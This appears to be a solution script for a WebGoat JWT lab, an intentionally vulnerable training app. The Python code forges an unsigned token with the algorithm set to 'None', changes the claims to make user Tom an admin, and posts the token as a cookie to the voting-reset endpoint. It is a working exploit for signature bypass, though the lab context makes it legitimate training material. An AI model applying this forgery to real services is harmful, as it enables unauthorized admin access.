# GET http://10.1.121.141:8080/WebGoat/JWT/votings
# Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NjQxMTA4NjgsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.WV7R6Uock2JcUycy1CguSgyCTZOyY74nNue4lj4Lf0VQsTmImu8hjWsW-dPdMGt7dEMGFOU8HWaffjnAL-hy6Q; JSESSIONID=423F2F80FD6D194DE92D39B80762E402
import requests
import base64
from os.path import abspath, dirname

host = "http://10.1.121.141:8080"
# 一开始搞成刷新那个了。
relative_url = "/WebGoat/JWT/votings/reset"
url = host + relative_url
jse_session_id = "423F2F80FD6D194DE92D39B80762E402"

jhs = jwt_header_string = '{"alg": "None"}'
jcs = jwt_claims_string = '{"iat":1564110868,"admin":"true","user":"Tom"}'
# jhs = jwt_header_string = ''
jh = jwt_header = base64.b64encode(bytes(jhs, "ascii"))
jc = jwt_claims = base64.b64encode(bytes(jcs, "ascii"))
js = jwt_signature = b''
jwt = jh + b'.' + jc + b'.' + js
jwt_string = jwt.decode("ascii")

result_file_name = "resetVote.txt"
result_file_path = dirname(abspath(__file__)) + "\\" + result_file_name


if __name__ == "__main__":
    print(jwt_string)
    cookies = {
        "access_token": jwt_string,
        "JSESSIONID": jse_session_id
    }
    r = requests.post(url, cookies=cookies)
    with open(result_file_path, 'w') as f:
        f.write(r.text)